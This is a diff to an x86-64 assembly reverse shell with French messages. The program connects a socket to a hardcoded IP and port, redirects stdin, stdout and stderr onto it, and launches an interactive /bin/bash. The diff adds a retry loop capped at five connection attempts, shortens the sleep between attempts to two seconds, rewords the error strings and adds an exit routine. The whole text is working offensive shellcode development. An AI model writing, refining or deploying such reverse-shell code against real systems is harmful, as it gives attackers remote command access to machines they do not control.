@@ -15,17 +15,22 @@ segment .rodata
 			at sin_port, dw 0x3905		; port in little endian
 			at sin_addr, dd 0x0100007f	; IP in little endian
 		iend
-	error_socket  db "[X] Error: socket échoué", 10
-	error_connect db "[X] Error: connect échoué", 10
-	error_dup2_0  db "[X] Error: dup2 stdin échoué", 10
-	error_dup2_1  db "[X] Error: dup2 stdout échoué", 10
-	error_dup2_2  db "[X] Error: dup2 stderr échoué", 10
-	error_execve db "[X] Error: execve échoué", 10
+	error_socket  db "[X] Erreur: socket échoué", 10
+	error_dup2_0  db "[X] Erreur: dup2 stdin échoué", 10
+	error_dup2_1  db "[X] Erreur: dup2 stdout échoué", 10
+	error_dup2_2  db "[X] Erreur: dup2 stderr échoué", 10
+	error_execve db "[X] Erreur: execve échoué", 10
+
+	retry_connect db "[O] Info: tentative de reconnection ...", 10
+	max_attempts db "[X] Erreur: Maximum de tentatives atteint", 10
 
 segment .data
     binsh db "/bin/bash", 0
     arg0      db "bash", 0
     arg1      db "-i", 0
+	
+	retry_count dd 0	; variable for counter
+
 
 	argv:
 		dq arg0
@@ -33,7 +38,7 @@ segment .data
 		dq 0
 
 	timespec:
-        dq 10      ; tv_sec = 10s
+        dq 2      ; tv_sec = 2s
         dq 0       ; tv_nsec = 0
 
 segment .text
@@ -104,7 +109,6 @@ _fd_stderr:
 
 
 _execution:
-	_execution:
     mov rax, 59                  ; syscall execve
     lea rdi, [rel binsh]     ; chemin vers /bin/bash
     lea rsi, [rel argv]          ; argv = {"bash", "-i", NULL}
@@ -114,20 +118,38 @@ _execution:
     test rax, rax
     js _execve_error
 
+_connect_error:
+    ; sleep(2)
+    	mov rax, 35             ; syscall nanosleep
+   	lea rdi, [rel timespec] ; struct timespec
+    	xor rsi, rsi            ; no old_timespec
+    	syscall
+   
+    	inc dword [retry_count]
+    	cmp dword [retry_count], 5
+    	jb _retry_connect_msg         ; retry connection
+
+	mov rax, 1
+	mov rdi, 2
+	mov rsi, max_attempts
+	mov rdx, 42
+	syscall
+	jmp _exit
+
+_retry_connect_msg:
+    mov rax, 1		; syscall write
+    mov rdi, 2		; error
+    mov rsi, retry_connect
+    mov rdx, 40 	; msglen
+    syscall
+
+    jmp _connection
 
 _socket_error:
 	mov rsi, error_socket ; put the message in rsi
 	mov rdx, 27
 	jmp _error
 
-_connect_error:
-    ; sleep(10)
-    mov rax, 35             ; syscall nanosleep
-    lea rdi, [rel timespec] ; struct timespec
-    xor rsi, rsi            ; no old_timespec
-    syscall
-
-    jmp _connection         ; retry connection
 
 _dup2_0_error:
     	mov rsi, error_dup2_0
@@ -158,4 +180,7 @@ _error:
 	xor rdi, rdi
 	syscall
 
-
+_exit:
+	mov rax, 60
+	mov rdi, 1
+	syscall
